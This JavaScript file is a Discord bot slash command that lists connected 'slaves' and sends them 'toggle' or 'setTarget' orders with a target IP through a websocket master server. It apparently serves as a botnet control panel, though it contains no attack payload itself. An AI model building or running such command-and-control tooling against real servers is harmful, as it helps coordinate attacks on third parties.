const { SlashCommandBuilder } = require('discord.js');
const { getSlaves, sendToSlave, sendToAllSlaves } = require('../ws/masterServer');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('shroom')
        .setDescription('Gestion des slaves')
        .addSubcommand(sub =>
            sub.setName('sendtoall')
               .setDescription('Envoyer une action à tous les slaves')
               .addStringOption(opt => 
                   opt.setName('action')
                      .setDescription('Action à exécuter')
                      .setRequired(true)
                      .addChoices(
                          { name: 'Toggle', value: 'toggle' },
                          { name: 'Set Target', value: 'setTarget' }
                      ))
               .addStringOption(opt => 
                   opt.setName('server')
                      .setDescription('Nouvelle IP si action=setTarget')
                      .setRequired(false)))
        .addSubcommand(sub =>
            sub.setName('sendtoone')
               .setDescription('Envoyer une action à un seul slave')
               .addStringOption(opt => 
                   opt.setName('uuid')
                      .setDescription('UUID du slave')
                      .setRequired(true))
               .addStringOption(opt => 
                   opt.setName('action')
                      .setDescription('Action à exécuter')
                      .setRequired(true)
                      .addChoices(
                          { name: 'Toggle', value: 'toggle' },
                          { name: 'Set Target', value: 'setTarget' }
                      ))
               .addStringOption(opt => 
                   opt.setName('server')
                      .setDescription('Nouvelle IP si action=setTarget')
                      .setRequired(false)))
        .addSubcommand(sub =>
            sub.setName('ls')
               .setDescription('Liste les slaves connectés')),
    async execute(interaction) {
        const sub = interaction.options.getSubcommand();
        if (sub === 'ls') {
            const slaves = getSlaves();
            await interaction.reply(`Slaves connectés: ${slaves.join(', ') || 'aucun'}`);
            return;
        }

        const action = interaction.options.getString('action');
        const server = interaction.options.getString('server');

        if (action === 'setTarget' && !server) {
            await interaction.reply({ content: 'Erreur : Vous devez fournir une IP pour setTarget', ephemeral: true });
            return;
        }

        const payload = action === 'setTarget' ? { action, server } : { action };

        if (sub === 'sendtoone') {
            const uuid = interaction.options.getString('uuid');
            sendToSlave(uuid, JSON.stringify(payload));
            await interaction.reply(`Action "${action}" envoyée à ${uuid}`);
        } else if (sub === 'sendtoall') {
            sendToAllSlaves(JSON.stringify(payload));
            await interaction.reply(`Action "${action}" envoyée à tous les slaves`);
        }
    }
};
